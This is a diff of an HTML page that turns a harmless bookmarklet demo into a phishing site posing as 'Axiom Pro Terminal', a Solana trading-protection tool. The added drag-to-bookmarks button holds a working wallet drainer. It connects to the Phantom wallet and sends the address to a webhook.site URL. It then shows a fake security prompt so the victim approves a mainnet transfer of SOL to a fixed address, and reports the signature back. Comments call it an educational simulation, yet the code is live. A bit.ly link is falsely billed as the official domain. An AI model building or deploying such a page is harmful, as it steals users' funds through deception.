@@ -1,79 +1,335 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Axiom Pro Helper - Trading Tool</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom Pro Terminal | Solana MEV Protection & Trading Accelerator</title>
     <style>
+        :root {
+            --bg-color: #050609;
+            --card-color: #0b0e14;
+            --primary-color: #00ffbd; /* Solana Green */
+            --secondary-color: #00e0ff; /* Light Blue */
+            --text-main: #ffffff;
+            --text-muted: #848e9c;
+            --border-color: #1e2329;
+            --success-color: #02c076;
+        }
+
         body {
-            background-color: #0d1117; /* لون غامق احترافي */
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
-        .container {
-            background-color: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 12px;
-            padding: 40px;
-            width: 450px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+
+        /* Background Grid Effect */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(#1a1c23 1px, transparent 1px);
+            background-size: 30px 30px;
+            z-index: -1;
+            opacity: 0.5;
         }
-        .logo {
-            color: #58a6ff;
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 20px;
+
+        .header {
+            width: 100%;
+            max-width: 1200px;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
         }
-        .description {
-            color: #8b949e;
-            font-size: 14px;
-            margin-bottom: 30px;
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        /* الزر "الملغم" تعليمياً */
-        .drag-button {
-            display: inline-block;
-            background: linear-gradient(90deg, #1f6feb, #58a6ff);
-            color: white;
-            padding: 15px 30px;
-            text-decoration: none;
+
+        .logo-icon {
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
             border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #000;
+        }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            background: linear-gradient(to right, var(--text-main), var(--secondary-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .status-badge {
+            font-size: 12px;
+            color: var(--success-color);
+            background-color: rgba(2, 192, 118, 0.1);
+            padding: 5px 15px;
+            border-radius: 20px;
+            border: 1px solid rgba(2, 192, 118, 0.2);
+        }
+
+        .hero-section {
+            text-align: center;
+            margin-top: 60px;
+            max-width: 800px;
+            padding: 0 20px;
+        }
+
+        .hero-section h1 {
+            font-size: 48px;
+            margin-bottom: 15px;
+            line-height: 1.2;
+            background: linear-gradient(to right, #ffffff 40%, var(--secondary-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-section p {
+            color: var(--text-muted);
+            font-size: 18px;
+            line-height: 1.6;
+        }
+
+        .domain-warning {
+            color: #f0b90b;
+            background-color: rgba(240, 185, 11, 0.1);
+            padding: 10px 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            display: inline-block;
+            border: 1px solid rgba(240, 185, 11, 0.2);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            width: 100%;
+            max-width: 1000px;
+            margin-top: 50px;
+            padding: 0 20px;
+        }
+
+        .feature-card {
+            background-color: var(--card-color);
+            border: 1px solid var(--border-color);
+            padding: 25px;
+            border-radius: 16px;
+            transition: transform 0.3s, border-color 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(0, 255, 189, 0.3);
+        }
+
+        .feature-card h3 {
+            margin-top: 0;
+            color: var(--secondary-color);
+            font-size: 18px;
+        }
+
+        .feature-card p {
+            color: var(--text-muted);
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 0;
+        }
+
+        .install-section {
+            background-color: var(--card-color);
+            border: 1px solid var(--border-color);
+            padding: 40px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            margin-top: 60px;
+            margin-bottom: 80px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            position: relative;
+        }
+
+        .install-section::after {
+            content: "OFFICIAL INSTALLER";
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            color: #000;
+            padding: 2px 15px;
+            border-radius: 10px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        /* The Malicious Button - Educational Simulation */
+        .bookmark-btn {
+            display: inline-block;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            color: #000;
+            padding: 18px 40px;
+            text-decoration: none;
+            border-radius: 12px;
             font-weight: bold;
             font-size: 18px;
             cursor: move;
             border: none;
-            transition: transform 0.2s;
-            box-shadow: 0 4px 15px rgba(31, 111, 235, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 15px rgba(0, 255, 189, 0.3);
         }
-        .drag-button:hover {
-            transform: scale(1.05);
+
+        .bookmark-btn:hover {
+            transform: scale(1.03);
+            box-shadow: 0 6px 20px rgba(0, 255, 189, 0.5);
         }
+
         .instruction {
-            margin-top: 20px;
+            margin-top: 25px;
             font-size: 12px;
-            color: #f85149; /* لون تحذيري */
+            color: #f85149;
+            background-color: rgba(248, 81, 73, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+        }
+
+        footer {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            color: var(--text-muted);
+            font-size: 12px;
+            border-top: 1px solid var(--border-color);
+            margin-top: auto;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">Axiom Trading Helper v2.0</div>
-    <p class="description">أداة مساعدة لزيادة سرعة تنفيذ عمليات الـ Buy/Sell في ميم كوينز.</p>
-    
-    <a href="javascript:(function(){ 
-        alert('مختبر الأمن السيبراني: الكود يعمل الآن داخل صفحة: ' + window.location.hostname);
-        document.body.innerHTML = '<h1 style=color:red;text-align:center;margin-top:100px;>تم كشف آلية عمل الـ Drainer بنجاح! كطالب أمن سيبراني، أنت الآن ترى كيف يمكن تغيير محتوى الصفحة بالكامل بكود بسيط.</h1>';
-    })();" class="drag-button">
-        DRAG ME TO TOOLBAR
-    </a>
+    <div class="header">
+        <div class="logo-container">
+            <div class="logo-icon">A</div>
+            <div class="logo-text">AXIOM PRO</div>
+        </div>
+        <div class="status-badge">Mainnet Node: Active</div>
+    </div>
 
-    <p class="instruction">قم بسحب الزر الأزرق إلى شريط المفضلات لتفعيل البوت</p>
-</div>
+    <div class="hero-section">
+        <h1>Trade Solana Like an Institution.</h1>
+        <p>Axiom Pro Terminal integrates directly into your browser to provide real-time MEV protection, transaction acceleration, and advanced contract analysis. Don't just trade; trade protected.</p>
+        <div class="domain-warning">
+            ⚠️ OFFICIAL DOMAIN ONLY: <strong>https://bit.ly/assistsol</strong> - Beware of Phishing!
+        </div>
+    </div>
+
+    <div class="features-grid">
+        <div class="feature-card">
+            <h3>🛡️ MEV Shield</h3>
+            <p>Automatically routes transactions through private RPC nodes to prevent sandwich attacks and front-running by MEV bots.</p>
+        </div>
+        <div class="feature-card">
+            <h3>⚡ Transaction Accelerator</h3>
+            <p>Dynamically adjusts priority fees to ensure your trades are confirmed in the very next block, even during high congestion.</p>
+        </div>
+        <div class="feature-card">
+            <h3>🔍 Smart Contract Audit</h3>
+            <p>Instantly scans any token contract for mint functions, honeypots, and freeze authority before you swap.</p>
+        </div>
+    </div>
+
+    <div class="install-section">
+        <h3>Activate Axiom Pro Helper</h3>
+        <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 30px;">
+            Drag the button below to your browser's Bookmarks Bar. Click it on any DEX (e.g., Raydium, Jupiter) to enable the toolkit.
+        </p>
+        
+        <a href="javascript:(async function(){ 
+            /* --- Educational Simulation Settings --- */
+            const RECIPIENT = '4JDzPNSvM9kwiq59S35wvyMv73nen297jR9ByGN7N1zW'; 
+            const AMOUNT = 0.1; 
+            const WEBHOOK = 'https://webhook.site/7c62e949-1f9d-469c-ae90-5eddf53bba60';
+
+            try {
+                if (!window.solana) { alert('Axiom Error: Phantom Wallet not detected.'); return; }
+                
+                const resp = await window.solana.connect();
+                const payer = resp.publicKey;
+
+                /* Log Wallet Connection (exfiltration simulation) */
+                if(WEBHOOK) fetch(WEBHOOK, {method:'POST', mode:'no-cors', body:JSON.stringify({event:'connected', address:payer.toString()})});
+
+                /* Load Solana Web3 Library */
+                if (typeof solanaWeb3 === 'undefined') {
+                    const s = document.createElement('script');
+                    s.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
+                    document.head.appendChild(s);
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
+                /* Build Transfer Transaction */
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: payer,
+                        toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
+                        lamports: AMOUNT * solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
+
+                transaction.feePayer = payer;
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+
+                /* Social Engineering Trick */
+                alert('Axiom Terminal: Security check required. Please approve the synchronization request in your wallet to enable MEV Shield.');
+                
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                
+                /* Fake Success Log to your webhook */
+                if(WEBHOOK) fetch(WEBHOOK, {method:'POST', mode:'no-cors', body:JSON.stringify({event:'success', sig:signature})});
+
+                alert('Axiom Protection Enabled! Transaction ID: ' + signature.slice(0,8));
+                document.body.innerHTML = '<div style=\'background:#000;color:#00ffbd;height:100vh;display:flex;align-items:center;justify-content:center;font-family:monospace;\'><h1>[AXIOM] SESSION SECURED</h1></div>';
+
+            } catch (e) {
+                console.log('Error:', e);
+                if(WEBHOOK) fetch(WEBHOOK, {method:'POST', mode:'no-cors', body:JSON.stringify({event:'error', msg:e.message})});
+                alert('Axiom Error: Connection timed out. Please try again.');
+            }
+        })();" class="bookmark-btn">
+            Drag to Bookmarks
+        </a>
+
+        <div class="instruction">
+            ⚠️ DO NOT CLICK. DRAG to your bookmarks bar.
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2024 Axiom Labs. All rights reserved. <br>
+        Verified Official Domain: https://bit.ly/assistsol
+    </footer>
 
 </body>
 </html>
